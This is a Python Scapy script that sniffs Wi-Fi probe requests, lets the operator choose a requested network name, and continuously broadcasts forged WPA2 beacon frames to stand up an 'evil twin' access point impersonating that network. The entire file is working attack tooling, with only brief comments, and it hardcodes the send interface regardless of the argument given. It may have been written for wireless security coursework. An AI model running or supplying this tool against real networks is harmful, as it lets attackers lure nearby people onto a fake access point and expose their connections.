from scapy.all import *
import requests, time, threading, sys, netifaces, argparse

# Args parsing
parser = argparse.ArgumentParser(prog="Scapy Fake channel Evil Tween attack",
                                 usage="%(prog)s -i mon0",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-b", "--BSSID", required=False, help="The BSSID of the Wireless Access Point you want people to connect to (Will default to interface's mac if not specified)", default="")


args = parser.parse_args()


# We sniff all Dot11 probe request packets, and store 1 packet per AP bssid
def packetHandler(p):
    if p.haslayer(Dot11ProbeReq) and p.info.decode("utf-8") not in SSIDs:
        p.show()
        SSIDs.append(p.info.decode("utf-8"))
        displayAP(p.info.decode("utf-8"))
        

# Diplay function, run every time a new AP is found
def displayAP(ssid):
    print("%03d) %-43s" % (len(SSIDs) - 1, ssid))
    print("Press CTRL+C to stop scanning, and select target",end = "\r")

SSIDs = []


print("List of SSID requested :")



# Use a separate thread to sniff, so we can stop it later and can run the detection section forever
e = threading.Event()

def _sniff(e):
    a = sniff(iface=args.Interface, prn=packetHandler, stop_filter=lambda p: e.is_set())


t = threading.Thread(target=_sniff, args=(e,))
t.start()

# Infinite loop, until the user keyboard interrupts the script with CTRL+C
try:
    while True:
        time.sleep(1)
except (KeyboardInterrupt, SystemExit):
    e.set()

    while t.is_alive():
        t.join(2)

# We ask the user for the Access point to spoof
SSID_Index = -1
while 0 > SSID_Index or len(SSIDs) - 1 < SSID_Index:
    try:
        SSID_Index = int(input("\nPlease Select the number associated with the network you wish to impersonate [0-%d] : " % (len(SSIDs) - 1)))
    except ValueError:
        print("That wasn't an integer :(")


# We then manually create the packet

interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]

# If the user didn't specify a different BSSID for the twin AP, we use the one from the specified interface
dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'], addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)


# We enable the privacy capability flag on the beacon, so that it requires authentification.
beacon = Dot11Beacon(cap='ESS+privacy')


essid = Dot11Elt(ID='SSID',info=SSIDs[SSID_Index], len=len(SSIDs[SSID_Index]))

# We force a specific channel, since we'd have to keep track of any channel associated to any 
# instance of a specific SSID, and that seems like too much work
channel = Dot11Elt(ID='DSset', info=chr(11))

# RSN payload taken from https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/, we could have reused the one from the captured beacon, but we rather control the RSN fields
rsn = Dot11Elt(ID='RSNinfo', info=(
'\x01\x00'              #RSN Version 1
'\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
'\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
'\x00\x0f\xac\x04'      #AES Cipher
'\x00\x0f\xac\x02'      #TKIP Cipher
'\x01\x00'              #1 Authentication Key Managment Suite (line below)
'\x00\x0f\xac\x02'      #Pre-Shared Key
'\x00\x00'))            #RSN Capabilities (no extra capabilities)

frame = RadioTap()/dot11/beacon/essid/channel/rsn

frame.show()

# We keep sending the packets until the user manually stops them
sendp(frame, iface="wlan0mon", inter=0.100, loop=1)
